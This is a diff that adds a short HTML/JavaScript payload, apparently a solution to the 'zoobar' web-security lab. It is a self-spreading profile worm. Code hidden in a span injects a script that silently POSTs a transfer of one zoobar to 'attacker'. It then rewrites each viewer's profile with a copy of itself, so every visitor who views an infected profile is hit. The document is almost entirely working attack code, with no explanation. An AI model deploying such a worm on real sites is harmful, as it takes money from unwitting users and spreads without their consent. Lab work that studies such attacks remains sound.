@@ -1,0 +1,25 @@
+<span id="zoobars" class="var d = document; var js = d.getElementById('javascript').innerHTML; var tag = d.createElement('script'); tag.setAttribute('type', 'text/javascript'); tag.innerHTML = js; d.body.appendChild(tag);">
+Headshot! 
+</span>
+<span style="display: none;" id="javascript">
+var formEncode = function(args) {
+  var output = '';
+  for (var name in args) {
+    if (output != '') { output += String.fromCharCode(38) }
+    output += encodeURIComponent(name) + '=' + encodeURIComponent(args[name]); 
+  }
+  console.log(output);
+  return output;
+}
+
+var pay=new XMLHttpRequest();
+pay.open('POST', '/transfer.php');
+pay.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+pay.send(formEncode({recipient: 'attacker', zoobars: 1, submission: 'Send'}));
+
+var profile = document.getElementById('zoobars').parentNode.innerHTML;
+var copy=new XMLHttpRequest();
+copy.open('POST', '/index.php');
+copy.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+copy.send(formEncode({profile_update: profile, profile_submit: 'Save'}));
+</span>
